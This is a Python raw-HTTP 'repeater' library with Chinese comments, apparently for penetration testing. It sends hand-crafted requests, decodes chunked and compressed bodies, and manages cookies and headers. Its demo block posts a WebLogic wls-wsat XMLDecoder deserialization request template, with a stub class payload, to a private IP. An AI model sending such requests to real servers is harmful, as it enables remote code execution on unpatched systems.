import gzip
import socket
import ssl
import zlib
import brotli
from dataclasses import dataclass
from typing import Dict, Optional, Tuple, Union, List


@dataclass
class RawResponse:
    """原始HTTP响应结构"""

    ok: bool
    error: str
    resp: bytes

    def __bool__(self) -> bool:
        return self.ok

    def text(self, encoding: str = "utf-8", errors: str = "replace") -> str:
        return self.resp.decode(encoding, errors=errors)

    def status_line(self) -> str:
        if not self.ok:
            return ""
        try:
            first_line = self.resp.split(b"\r\n")[0]
            return first_line.decode("utf-8", errors="replace")
        except Exception:
            return ""

    def headers(self) -> Dict[str, List[str]]:
        """
        返回解析后的响应头字典。
        key 已统一小写，值为列表（多值头如 set-cookie 长度 >= 1）。
        响应不合法或解析失败时返回空字典。
        """
        if not self.resp:
            return {}
        parsed, _ = _parse_headers(self.resp)
        return parsed

    def body(self) -> bytes:
        """
        返回原始响应体字节。
        已由 send_raw_request 完成 chunked 解码与 Content-Encoding 解压，
        此处只做 header/body 分割。
        """
        if not self.resp:
            return b""
        _, body_part = _parse_headers(self.resp)
        return body_part

    def body_text(self, encoding: str = "utf-8", errors: str = "replace") -> str:
        """
        返回解码后的响应体字符串。
        encoding 默认 utf-8；若响应头中 Content-Type 携带 charset，
        可手动传入对应编码。
        """
        return self.body().decode(encoding, errors=errors)

    def build_cookie(self, old_cookie: str = "") -> Optional[str]:
        """
        从响应的 Set-Cookie 头构造 Cookie 请求头字符串。
        若提供 old_cookie，则以其为基础合并新 cookie，新值覆盖同名旧值。

        返回格式：`name1=value1;name2=value2`
        若响应中不含 Set-Cookie 头且 old_cookie 为空则返回 None。
        """
        set_cookies: List[str] = self.headers().get("set-cookie", [])

        # 解析 old_cookie 为有序字典
        merged: Dict[str, str] = {}
        if old_cookie:
            for pair in old_cookie.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    merged[k.strip()] = v.strip()
                elif pair:
                    merged[pair] = ""

        if not set_cookies and not merged:
            return None

        # 用新 Set-Cookie 覆盖同名旧值
        for cookie in set_cookies:
            name_value = cookie.split(";", 1)[0].strip()
            if "=" in name_value:
                k, v = name_value.split("=", 1)
                merged[k.strip()] = v.strip()
            elif name_value:
                merged[name_value] = ""

        if not merged:
            return None

        return ";".join(
            f"{k}={v}" if v else k
            for k, v in merged.items()
        )


def _extract_host_and_port(raw: bytes) -> Optional[Tuple[str, Optional[int]]]:
    try:
        lower = raw.lower()
        key = b"\r\nhost:"
        idx = lower.find(key)
        if idx == -1:
            return None

        start = idx + len(key)
        end = lower.find(b"\r\n", start)
        if end == -1:
            end = len(raw)

        host_value = raw[start:end].strip().decode()

        if host_value.startswith("["):
            bracket_end = host_value.find("]")
            if bracket_end != -1:
                host = host_value[1:bracket_end]
                port_part = host_value[bracket_end + 1:]
                if port_part.startswith(":"):
                    try:
                        port = int(port_part[1:])
                        return host, port
                    except ValueError:
                        pass
                return host, None

        if ":" in host_value:
            parts = host_value.rsplit(":", 1)
            try:
                return parts[0], int(parts[1])
            except (ValueError, IndexError):
                pass

        return host_value, None
    except Exception:
        return None


def _parse_headers(header_bytes: bytes) -> Tuple[Dict[str, List[str]], bytes]:
    """
    解析 HTTP 响应头

    返回:
        headers: Dict[str, List[str]]
            所有头字段统一以列表存储；
            单值头列表长度为 1，多值头（如 set-cookie）列表长度 >= 1。
        body_part: bytes
    """
    headers: Dict[str, List[str]] = {}

    header_separator = b"\r\n\r\n"
    separator_index = header_bytes.find(header_separator)

    if separator_index == -1:
        header_part = header_bytes
        body_part = b""
    else:
        header_part = header_bytes[:separator_index]
        body_part = header_bytes[separator_index + len(header_separator):]

    lines = header_part.split(b"\r\n")

    for line in lines[1:]:
        if b":" not in line:
            continue

        key, value = line.split(b":", 1)
        key = key.decode("latin-1").strip().lower()
        value = value.decode("latin-1").strip()

        if key in headers:
            headers[key].append(value)
        else:
            headers[key] = [value]

    return headers, body_part


def _decode_chunked(data: bytes) -> Tuple[bytes, str]:
    result = bytearray()
    pos = 0

    while pos < len(data):
        line_end = data.find(b"\r\n", pos)
        if line_end == -1:
            return bytes(result), "Truncated chunk: missing CRLF after chunk size"

        size_line = data[pos:line_end]
        semicolon = size_line.find(b";")
        if semicolon != -1:
            size_line = size_line[:semicolon]

        try:
            chunk_size = int(size_line.strip(), 16)
        except ValueError:
            return bytes(result), f"Invalid chunk size: {data[pos:line_end]!r}"

        if chunk_size == 0:
            break

        data_start = line_end + 2
        data_end = data_start + chunk_size

        if data_end > len(data):
            result += data[data_start:]
            return (
                bytes(result),
                f"Truncated chunk: expected {chunk_size} bytes, got {len(data) - data_start}",
            )

        result += data[data_start:data_end]
        pos = data_end + 2

    return bytes(result), ""


def _decode_content_encoding(body: bytes, content_encoding: str) -> Tuple[bytes, str]:
    encoding = content_encoding.lower().strip()

    if not encoding or encoding == "identity":
        return body, ""

    if encoding == "gzip":
        try:
            return gzip.decompress(body), ""
        except Exception as e:
            return body, f"gzip decompress failed: {e}"

    if encoding == "deflate":
        try:
            return zlib.decompress(body), ""
        except zlib.error:
            try:
                return zlib.decompress(body, wbits=-zlib.MAX_WBITS), ""
            except Exception as e:
                return body, f"deflate decompress failed: {e}"

    if encoding == "br":
        try:
            return brotli.decompress(body), ""
        except Exception as e:
            return body, f"brotli decompress failed: {e}"

    return body, f"Unknown Content-Encoding '{encoding}', returned raw body"


def _get_header(headers: Dict[str, List[str]], key: str) -> Optional[str]:
    """取单值头的首个值，不存在时返回 None。"""
    values = headers.get(key)
    return values[0] if values else None


def _get_header_joined(headers: Dict[str, List[str]], key: str, sep: str = ", ") -> str:
    """将同名头的所有值用 sep 拼接后返回，不存在时返回空字符串。"""
    values = headers.get(key)
    return sep.join(values) if values else ""


def send_raw_request(
    raw_request: bytes,
    port: Optional[int] = None,
    host: Optional[str] = None,
    use_ssl: bool = False,
    verify_ssl: bool = False,
    timeout: int = 8,
    max_response_size: int = 3 * 1024 * 1024,
) -> RawResponse:
    """
    发送原始HTTP请求并接收响应
    """
    conn = None

    try:
        if port is None or not host:
            host_port = _extract_host_and_port(raw_request)
            if not host_port:
                return RawResponse(
                    ok=False, error="Host header not found in request", resp=b""
                )
            if port is None and not host_port[1]:
                port = 443 if use_ssl else 80
            elif port is None:
                port = host_port[1]

            if not host and not host_port[0]:
                return RawResponse(ok=False, error="Host header error", resp=b"")
            elif not host:
                host = host_port[0]

        try:
            sock = socket.create_connection((host, port), timeout=timeout)
        except socket.timeout:
            return RawResponse(
                ok=False, error=f"Connection timeout to {host}:{port}", resp=b""
            )
        except socket.gaierror as e:
            return RawResponse(
                ok=False, error=f"DNS resolution failed for {host}: {str(e)}", resp=b""
            )
        except ConnectionRefusedError:
            return RawResponse(
                ok=False, error=f"Connection refused to {host}:{port}", resp=b""
            )
        except OSError as e:
            return RawResponse(ok=False, error=f"Network error: {str(e)}", resp=b"")

        if use_ssl:
            try:
                context = ssl.create_default_context()
                if not verify_ssl:
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                conn = context.wrap_socket(sock, server_hostname=host)
            except ssl.SSLError as e:
                sock.close()
                return RawResponse(ok=False, error=f"SSL error: {str(e)}", resp=b"")
            except Exception as e:
                sock.close()
                return RawResponse(
                    ok=False, error=f"SSL handshake failed: {str(e)}", resp=b""
                )
        else:
            conn = sock

        try:
            conn.settimeout(timeout)
            conn.sendall(raw_request)
        except socket.timeout:
            return RawResponse(ok=False, error="Send timeout", resp=b"")
        except Exception as e:
            return RawResponse(ok=False, error=f"Send failed: {str(e)}", resp=b"")

        header_buf = bytearray()
        header_separator = b"\r\n\r\n"

        try:
            while header_separator not in header_buf:
                chunk = conn.recv(1024 * 64)
                if not chunk:
                    break
                header_buf += chunk

                if len(header_buf) > max_response_size:
                    return RawResponse(
                        ok=False,
                        error="Response headers too large or invalid",
                        resp=bytes(header_buf),
                    )
        except socket.timeout:
            if not header_buf:
                return RawResponse(
                    ok=False,
                    error="Timeout while waiting for response headers",
                    resp=b"",
                )

        header_buf = bytes(header_buf)
        body_start = b""

        if header_separator in header_buf:
            sep_idx = header_buf.find(header_separator)
            body_start = header_buf[sep_idx + len(header_separator):]
            header_data = header_buf[: sep_idx + len(header_separator)]
        else:
            header_data = header_buf

        headers, _ = _parse_headers(header_data)

        # Content-Length：取首个值
        content_length: Optional[int] = None
        content_length_str = _get_header(headers, "content-length")
        if content_length_str is not None:
            try:
                cl = int(content_length_str)
                content_length = cl if cl >= 0 else None
            except ValueError:
                content_length = None

        response_parts = [header_data, body_start]
        total_received = len(header_data) + len(body_start)

        if content_length is not None:
            body_length_to_read = content_length - len(body_start)

            while body_length_to_read > 0:
                if total_received > max_response_size:
                    return RawResponse(
                        ok=False,
                        error=f"Response exceeded maximum size limit of {max_response_size} bytes",
                        resp=b"".join(response_parts),
                    )
                try:
                    chunk = conn.recv(min(body_length_to_read, 65536))
                    if not chunk:
                        break
                    response_parts.append(chunk)
                    body_length_to_read -= len(chunk)
                    total_received += len(chunk)
                except socket.timeout:
                    return RawResponse(
                        ok=False,
                        error="Timeout while receiving response body (Content-Length specified)",
                        resp=b"".join(response_parts),
                    )
                except Exception as e:
                    return RawResponse(
                        ok=False,
                        error=f"Receive error: {str(e)}",
                        resp=b"".join(response_parts),
                    )
        else:
            while True:
                if total_received > max_response_size:
                    return RawResponse(
                        ok=False,
                        error=f"Response exceeded maximum size limit of {max_response_size} bytes",
                        resp=b"".join(response_parts),
                    )
                try:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    response_parts.append(chunk)
                    total_received += len(chunk)
                except socket.timeout:
                    break
                except Exception as e:
                    return RawResponse(
                        ok=False,
                        error=f"Receive error: {str(e)}",
                        resp=b"".join(response_parts),
                    )

        response_data = b"".join(response_parts)

        if not response_data:
            return RawResponse(
                ok=False, error="No response received from server", resp=b""
            )

        # Transfer-Encoding：拼接所有值后检查是否含 chunked
        transfer_encoding = _get_header_joined(headers, "transfer-encoding")
        if "chunked" in transfer_encoding.lower():
            _, raw_body = _parse_headers(response_data)
            decoded_body, chunk_err = _decode_chunked(raw_body)
            if chunk_err:
                return RawResponse(
                    ok=False,
                    error=f"Chunked decode error: {chunk_err}",
                    resp=header_data + decoded_body,
                )
            response_data = header_data + decoded_body

        # Content-Encoding：取首个值
        content_encoding = _get_header(headers, "content-encoding") or ""
        if content_encoding:
            _, body_to_decompress = _parse_headers(response_data)
            decompressed, enc_err = _decode_content_encoding(
                body_to_decompress, content_encoding
            )
            if enc_err:
                return RawResponse(
                    ok=False,
                    error=f"Content-Encoding decode error: {enc_err}",
                    resp=response_data,
                )
            response_data = header_data + decompressed

        return RawResponse(ok=True, error="", resp=response_data)

    except Exception as e:
        return RawResponse(ok=False, error=f"Unexpected error: {str(e)}", resp=b"")

    finally:
        if conn:
            try:
                conn.close()
            except Exception:
                pass


def _fix_content_length(raw: bytes) -> bytes:
    separator = b"\r\n\r\n"
    sep_idx = raw.find(separator)

    if sep_idx == -1:
        return raw

    header_part = raw[:sep_idx]
    body_part = raw[sep_idx + len(separator):]
    body_len = len(body_part)

    lines = header_part.split(b"\r\n")
    filtered = [
        line for line in lines if not line.lower().startswith(b"content-length")
    ]

    if body_len > 0:
        filtered.append(f"Content-Length: {body_len}".encode())

    new_header = b"\r\n".join(filtered)
    return new_header + separator + body_part


def _insert_headers(raw_request: bytes, headers: Dict[str, Union[str, bytes]]) -> bytes:
    """
    向原始 HTTP 请求中插入或覆盖头字段。
    """
    separator = b"\r\n\r\n"
    sep_idx = raw_request.find(separator)

    if sep_idx == -1:
        header_part = raw_request
        body_part = b""
    else:
        header_part = raw_request[:sep_idx]
        body_part = raw_request[sep_idx:]  # 保留 \r\n\r\n + body

    lines = header_part.split(b"\r\n")
    request_line = lines[0]
    header_lines = lines[1:]

    # 构建待插入的规范化映射：lower_key -> (原始key bytes, 值 bytes)
    pending: Dict[bytes, Tuple[bytes, bytes]] = {}
    for k, v in headers.items():
        k_bytes = k.encode("latin-1") if isinstance(k, str) else k
        v_bytes = v.encode("latin-1") if isinstance(v, str) else v
        assert isinstance(k_bytes, bytes)
        assert isinstance(v_bytes, bytes)
        pending[k_bytes.lower()] = (k_bytes, v_bytes)

    # 遍历已有头，替换命中的
    new_header_lines: List[bytes] = []
    replaced: set[bytes] = set()

    for line in header_lines:
        if b":" not in line:
            new_header_lines.append(line)
            continue

        field_name, _ = line.split(b":", 1)
        lower_name = field_name.strip().lower()

        if lower_name in pending:
            k_bytes, v_bytes = pending[lower_name]
            new_header_lines.append(k_bytes + b": " + v_bytes)
            replaced.add(lower_name)
        else:
            new_header_lines.append(line)

    # 追加未命中的新头
    for lower_key, (k_bytes, v_bytes) in pending.items():
        if lower_key not in replaced:
            new_header_lines.append(k_bytes + b": " + v_bytes)

    result = b"\r\n".join([request_line] + new_header_lines) + body_part
    return result

def repeater(
    raw_request: Union[str, bytes],
    port: Optional[int] = None,
    host: Optional[str] = None,
    use_ssl: bool = False,
    verify_ssl: bool = False,
    timeout: int = 8,
    max_response_size: int = 3 * 1024 * 1024,
    fix_content_length: bool = True,
    headers: Optional[Dict[str, Union[str, bytes]]] = None
) -> RawResponse:
    if isinstance(raw_request, str):
        raw_request = raw_request.replace("\r\n", "\n").replace("\r", "\n")
        assert isinstance(raw_request, str)
        raw_request = raw_request.replace("\n", "\r\n").encode("utf-8")

    if headers is None:
        headers = {}
    assert isinstance(headers, dict)
    if headers.get("Connection") is None:
        headers["Connection"] = "close"
    assert isinstance(raw_request, bytes)
    raw_request = _insert_headers(raw_request, headers)

    assert isinstance(raw_request, bytes)
    if fix_content_length:
        raw_request = _fix_content_length(raw_request)

    assert isinstance(raw_request, bytes)
    return send_raw_request(
        raw_request=raw_request,
        port=port,
        host=host,
        use_ssl=use_ssl,
        verify_ssl=verify_ssl,
        timeout=timeout,
        max_response_size=max_response_size,
    )


if __name__ == "__main__":
    http_request_local = """POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.192.148:28689
Content-Type: text/xml;charset=UTF-8
Content-Length: 5367
User-Agent: Mozilla/5.0
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <void class="weblogic.utils.Hex" method="fromHexString" id="cls">
                    <string>0xcafebabe</string>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
"""
    response_local = repeater(http_request_local)
    if response_local.ok:
        print(f"✓ 成功, 响应大小: {len(response_local.resp)} 字节")
        print(f"状态行: {response_local.status_line()}")
        print(f"\n响应预览:\n{response_local.text()}")
    else:
        print(f"✗ 失败: {response_local.error}")